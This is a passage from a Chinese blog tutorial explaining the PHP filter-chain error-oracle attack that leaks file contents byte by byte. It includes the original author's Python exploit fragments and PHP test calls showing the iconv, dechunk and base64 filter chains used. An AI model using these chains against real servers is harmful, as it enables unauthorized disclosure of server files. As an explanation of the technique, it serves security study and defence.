<h3 id="c-移动所有位置"><a href="#c-移动所有位置" class="headerlink" title="c.移动所有位置"></a>c.移动所有位置</h3><p>​	到目前为止,我们基本解决了8字节中的1-6位置的获取,至于7-8位,我们可以先进行一次r4,然后再次重复上述流程即可获得.</p>
<p><strong>但是超过8字节的位置呢?</strong></p>
<p>观察之前的上述操作,我们引入了冗余字节,最后又剔除了冗余字节,实际上我们每次进行flip操作后,后续的字节都会向前移动,所以我们进行的flip次数越多,我们就能拿到距离开头越远的字符.</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abcd efgh ijkl mn== -&gt;flip-&gt; </span><br><span class="line">bafe dcji hg+0 DAD3 -&gt;r4-&gt;</span><br><span class="line">efab ijcd 0+gh -&gt;flip-&gt;</span><br><span class="line">feji ba+0 dcD3 -&gt;r4-&gt;</span><br><span class="line">ijef 0+ab 3Dcd</span><br></pre></td></tr></table></figure>

<p>这样我们就可以获得第9位的字符,我们可以观察到规律,以ij为例,每次使用flip&#x2F;r4都会使这两个字符前进4个字节位置.</p>
<p>所以我们可以根据这个规律,对于下标为 n 的字符，只需要进行 n&#x2F;&#x2F;4 次 flip&#x2F;r4 组合就能将其位移到字符串的前端，最后前后可以使用 r4&#x2F;r2 进行微调就行</p>
<p>作者的脚本中这个算法为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_nth</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> flip, r2, r4</span><br><span class="line">    o = []</span><br><span class="line">    chunk = n // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> chunk % <span class="number">2</span> == <span class="number">1</span>: o.append(r4)</span><br><span class="line">    o.extend([flip, r4] * (chunk // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) ^ (chunk % <span class="number">2</span> == <span class="number">1</span>): o.append(r2)</span><br><span class="line">    <span class="keyword">return</span> join(*o)</span><br></pre></td></tr></table></figure>



<h3 id="d-基于base64来预测"><a href="#d-基于base64来预测" class="headerlink" title="d.基于base64来预测"></a>d.基于base64来预测</h3><p>​	但以上的所有的理论都来自于一个条件,那就是一个拥有两个等号的base64字符串,如果我们将文件内容进行base64编码后并没有两个等号的话,以上就不成立了.</p>
<p>​	所以我们的目标又回到了如何<strong>不依赖文件内容</strong>、同时也<strong>不能过度修改文件内容</strong>的情况下产生一个满足要求的 Base64 字符串。</p>
<p>又或者说,我们<strong>有没有办法检测源文件内容经过base64编码后是否有两个等号</strong>?</p>
<p>​	到目前为止,我们又有能够判断服务器的某些条件的oracle只有<strong>dechunk</strong>,我们是不是可以利用这个 Oracle 来服务其他的判断条件呢？比如此处的等号.</p>
<p>​	那么有没有一种编码格式可以对数字字母都无效，但是可以把等号变成其他更长字节长度的字符，使得长度过长从而导致服务器产生内存错误呢？</p>
<p>​	于是我们大概的想法是,<strong>如果该base64编码存在等号,经过某个编码使长度无限扩大最终导致服务器内存错误;如果没有等号,那么经过编码就不会导致服务器内存错误</strong></p>
<ul>
<li><strong>根据目的来寻找编码:convert.quoted-printable-encode</strong> :</li>
</ul>
<p>​	这个编码会将一个&#x3D;编码成&#x3D;3D,从一个字节变成了3个字节,而对其他数字字母并不会生效,这完美符合了我们的需求.</p>
<p>所以我们现在的做法就是：</p>
<ol>
<li>获取 Part 1 中 n 组 convert.iconv.L1.UCS-4LE 组合会致使服务器产生内存错误的临界值 n</li>
<li>使用 convert.base64-encode|convert.base64-encode 两次 Base64 编码对文件内容进行编码</li>
<li>使用大量的 convert.quoted-printable-encode 编码对上一步 Base64 结果中的等号进行数次编码</li>
<li>最后拼接上 n-1 组 convert.iconv.L1.UCS-4LE 组合</li>
</ol>
<p>​	按照如上步骤，如果我们通过文件内容得到的 Base64 编码中含有两个等号，则会因为后续通过大量的 convert.quoted-printable-encode 编码扩展，拼接上原本不会让服务器产生内存错误的 n-1 组 convert.iconv.L1.UCS-4LE ，致使服务器产生了内存错误；如果没有等号，即使经过 大量的 convert.quoted-printable-encode 编码扩展也不会扩展字节，拼接上 n-1 组 convert.iconv.L1.UCS-4LE 也不会产生内存错误。完美~~!</p>
<p>​	不过仍有问题,此时我们拥有了判断文件内容经过两次 Bae64 之后是否有等号的 Oracle 了，<strong>但是这仅仅只是判断有等号</strong>，这种情况还包括了 1 或者 2 个等号，况且，我们最终的目的还是需要获得拥有两个 &#x3D; 的 Base64 编码，仅仅只是能判断有没有等号还是不行。</p>
<h3 id="e-找到特殊的base64"><a href="#e-找到特殊的base64" class="headerlink" title="e.找到特殊的base64"></a>e.找到特殊的base64</h3><p>​	我们再仔细回顾一下 Base64 的编码规则，等号是由于 Base64 编码填充形成的，对于等号填充形式，基本上我们有三种状态：1 个等号、2 个等号、没有等号。而其实这几种状态又是可以相互转移的，我们分别考虑：</p>
<ol>
<li>在没有等号的情况下，字符串长度 n ，总 bit 长度为 <code>8*n</code> 恰好为 Base64 分组 6的倍数，此时如果我们再添加 <code>2+3*k (k&gt;=0)</code> 个字节即可获得 1 个等号的填充；或者再添加 <code>1+3*k (k&gt;=0)</code> 个字节即可获得 2 个等号的填充</li>
<li>在有 1 个等号的情况下，字符串长度 n ，总 bit 长度为 <code>8*n = 6*(n+2) - 8 = 6*n +4</code> ，此时如果我们再添加 <code>2+3*k (k&gt;=0)</code> 个字节即可获得 2 个等号的填充；或者再添加 <code>1+3*k (k&gt;=0)</code> 个字节得到没有等号填充的状态</li>
<li>在有 2 个等号的情况下，我们不需要额外填充</li>
</ol>
<p>​	在我们上述的oracle攻击中,无法判断原来的内容编码后有多少个等号,但是我们可以通过判断出没有等号的情况，那么我们是不是可以通过没有等号的情况，将其转移成固定有两个等号的情况呢？</p>
<p>所以我们接下来我们需要找到一个可以产生 <code>1+3*k</code> 或者 <code>2+3*k</code> 字节的编码形式。</p>
<p>这样的话选择就有很多了,例如</p>
<p><strong>convert.iconv..CSISO2022KR</strong> 编码,可以在头部添加固定字符<code>\x1b$)C</code></p>
<p>这时就又回到我们状态转移的问题上来了，<strong>虽然我们无法判断有几个等号，但是我们可以判断没有等号的情况</strong>，而我们知道通过之前的 Oracle ，只有没有等号的情况是无法产生报错的，而这几种状态是可以相互转移的。</p>
<p>所以！我们只要覆盖这三种状态，判断出哪一种是没有等号的状态，再对其进行状态转移即可：</p>
<ol>
<li>首先通过对原内容进行编码的为状态 1 ：convert.base64-encode|convert.base64-encode</li>
<li>通过增加了 1 次 4 字节冗余编码的为状态 2 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode</li>
<li>通过增加了 2 次 4 字节冗余编码的为状态 3 ：convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode</li>
</ol>
<p>因为根据上文对 Base64 编码规则的推断，<strong>每增加一次 4 字节冗余就能使得编码状态发生相应的转移</strong>，所以无论最初的状态 1 是什么，以上三种都能覆盖等号的三种状态。</p>
<p>然后我们再用之前提到的 Oracle 判断其中没有等号的状态，再将其转移到有 2 个等号的状态，就必定能产生满足我们有 2 个等号的 Base64 编码了！</p>
<p>原作者脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;detecting equals&#x27;</span>)</span><br><span class="line">j = [</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">    req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(j) != <span class="number">2</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">1</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">2</span>] == <span class="literal">False</span>:</span><br><span class="line">    header = <span class="string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;j: <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;header: <span class="subst">&#123;header&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-处理剩余字节"><a href="#4-处理剩余字节" class="headerlink" title="4.处理剩余字节"></a>4.处理剩余字节</h2><p>根据前三步,回顾一下我们解决了哪些问题</p>
<ol>
<li>必定产生一个带有 2 个等号的 Base64 字符串</li>
<li>可以让字符串中任一字节移动到首位</li>
<li>可以利用 dechunk 判断字符串首位是否在 a-fA-F0-9 范围内</li>
</ol>
<p>​	虽然完成了这三部分,<strong>但是我们现在只能判断字符是否在一个大概范围内</strong>,我们接下来的目的就是设法准确判断第一个字节.</p>
<p>​	根据前文的思路,那么我们会想:<strong>是否存在这么一些 filter ，可以单独对每个字母生效将其转换到 a-fA-F0-9 的范围内呢？</strong></p>
<p>​	比如假设有这么一个 1to1 的 filter ，它只对 z 字母有效，可以把 z 转换到 a 字符，对其他字母都不生效；这样一来，如果第一个字母是 z 的话，我们就可以利用这个 filter 将其转换到 a ，再利用最初的 Orcale 进行判断了，此时就不会产生内存错误；而如果不是 z 的话，就不会被转换，仍然产生内存错误。</p>
<p>​	不过要找到的话很难,我们可以退而求其次,先判断出一些字母,这些字母集合为 A ，其他另外某几个字母集合 B ，倘若有这么一个 filter 可以判断 A ∪ B ，但是因为集合 A 已经被我们排除了，所以这个 filter 尽管没有很满足我们 1to1 的要求，但是也能协助我们转换 B 集合部分的字母。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rot1 = &#x27;convert.iconv.437.CP930&#x27;</span><br><span class="line"># 会将字母向后移动一位，所以称呼为 rot1 ，比如 a-&gt;b, b-&gt;c</span><br><span class="line"># 但是只对部分字母有效，初步测试为 a-h 范围，不包括数字，其他字母会有其他规则 i-&gt;q ，后续就不是 rot1 了</span><br><span class="line">rot13 = &#x27;string.rot13&#x27;</span><br><span class="line"># rot13 算法，向后移动 13 位</span><br><span class="line">tolower = &#x27;string.tolower&#x27;</span><br><span class="line"># 将大写字母转换成小写</span><br></pre></td></tr></table></figure>

<p>利用string.tolower我们可以把所有大写字母转换成小写字母,这样我们只用分析小写字母和数字了</p>
<h3 id="a-f"><a href="#a-f" class="headerlink" title="a-f"></a>a-f</h3><p>由于a-f,0-9这个范围,我们可以直接通过dechunk来判断出范围.</p>
<p>接着通过一次rot1转换,,我们可以把f排除范围了,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,a&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,e&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,f&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;g&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>接着判断a-e,由于rot1对a-e都生效,所以多次应用rot1即可逐个排除</strong></p>
<p>但是我们怎么判断排除a-e之后剩下的是f呢?万一是数字呢?所以我们还需要找到一个对 f 生效，对数字不生效的 filter ，于是作者得到的 filter 如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,f&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,0&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">// ... 此处省略，该 filter 对于数字都会产生一个不可见字符</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,9&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>这样我们就能判断字符f了.</p>
<p>此处作者脚本:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a-e</span></span><br><span class="line"><span class="keyword">for</span> n in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">req</span>(f<span class="string">&#x27;&#123;prefix&#125;|&#x27;</span> + f<span class="string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span>*(n+<span class="number">1</span>) + f<span class="string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;edcba&#x27;</span>[n]</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>使用了 be 编码，作者实际是较长的字符串进行判断的，在处理较长字符串的时候可能存在不可见字符等冗余问题需要去除</p>
<h3 id="n-s-i-k-v-x"><a href="#n-s-i-k-v-x" class="headerlink" title="n-s i-k v-x"></a>n-s i-k v-x</h3><p><strong>借助rot13,可以将n-s转换成a-f</strong></p>
<p><strong>对于i-k在rot1编码规则中会将i-&gt;q,再次使用rot13可以得到d-f</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.437.CP930/resource=data:,i&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;q&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.437.CP930/resource=data:,j&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.437.CP930/resource=data:,k&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;s&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>借用rot13,可以将v-x转换成i-k的范围,然后复用上述步骤</strong></p>
<p>此时我们解决了2<code>*6+3*2=18</code>个字母,还剩8个字母与数字来判断</p>
<h3 id="检索数字"><a href="#检索数字" class="headerlink" title="检索数字"></a>检索数字</h3><p>​	在 Base64 编码中，因为编码规则都是相对固定的，尤其是相对字符串第一个字节来说，因为在 Base64 分组的时候，第一个字节可以直接编码得到 Base64 编码中的第一位，以 1 为例，如下：</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213907.png" alt="image-20240526175254298" data-caption="image-20240526175254298" loading="lazy"></p>
<p>根据前面的我们现在可以判断所有字母了,也可以分清字母和数字了.</p>
<p>所以倘若我们把所有数字提取到第一位,并进行一次base64编码,得到的编码结果我们再去判断第一位是什么字母,就可以大概推出数字的范围:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0-3 -&gt; M</span><br><span class="line">4-7 -&gt; N</span><br><span class="line">8-9 -&gt; O</span><br></pre></td></tr></table></figure>

<p>然后我们再使用 r2 交换 Base64 的第二位，因为在 Base64 分组中，Base64 的第二位的高 bit 位仍然受到原文第一个字节的影响，所以根据编码结果第二位的范围我们就可以最终确定这个数字是什么了！例如 0-3 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; CDEFGH</span><br><span class="line">1 -&gt; STUVWX</span><br><span class="line">2 -&gt; ijklmn</span><br><span class="line">3 -&gt; yz*</span><br></pre></td></tr></table></figure>

<p>当然仍然有可能编码结果下一位仍然是数字，例如 3s 编码结果为 M3M&#x3D; ，但是根据我们之前把 0-2 都排除了，剩余的就剩下是 3 了，所以依旧可以判断出来。</p>
<p>其余数字类似，就不再赘述。</p>
<p>至此,我们就完成了所有字符的翻译工作了,这个oracle文件读取攻击的原理也被阐述完全了</p>

    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/PHP/" rel="tag">PHP</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1732530874302"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">一.攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87%E7%BC%96%E7%A0%81%E6%9D%A5%E4%BD%BFPHP%E4%BA%A7%E7%94%9F%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1.通过编码来使PHP产生内存错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BD%BF%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">2.使文件泄露第一个字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B3%84%E9%9C%B2%E5%89%A9%E4%BD%99%E5%AD%97%E8%8A%82"><span class="toc-number">2.3.</span> <span class="toc-text">3.泄露剩余字节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-%E5%A4%84%E7%90%86%E5%89%8D4%E4%B8%AA%E5%AD%97%E8%8A%82"><span class="toc-number">2.3.1.</span> <span class="toc-text">a.处理前4个字节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b-%E5%AF%B9%E4%BA%8Ebase64%E4%B8%A4%E4%B8%AA%E7%AD%89%E5%8F%B7%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">2.3.2.</span> <span class="toc-text">b.对于base64两个等号的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-%E7%A7%BB%E5%8A%A8%E6%89%80%E6%9C%89%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.3.3.</span> <span class="toc-text">c.移动所有位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d-%E5%9F%BA%E4%BA%8Ebase64%E6%9D%A5%E9%A2%84%E6%B5%8B"><span class="toc-number">2.3.4.</span> <span class="toc-text">d.基于base64来预测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#e-%E6%89%BE%E5%88%B0%E7%89%B9%E6%AE%8A%E7%9A%84base64"><span class="toc-number">2.3.5.</span> <span class="toc-text">e.找到特殊的base64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%A4%84%E7%90%86%E5%89%A9%E4%BD%99%E5%AD%97%E8%8A%82"><span class="toc-number">2.4.</span> <span class="toc-text">4.处理剩余字节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-f"><span class="toc-number">2.4.1.</span> <span class="toc-text">a-f</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n-s-i-k-v-x"><span class="toc-number">2.4.2.</span> <span class="toc-text">n-s i-k v-x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E6%95%B0%E5%AD%97"><span class="toc-number">2.4.3.</span> <span class="toc-text">检索数字</span></a></li></ol></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":350,"height":350},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>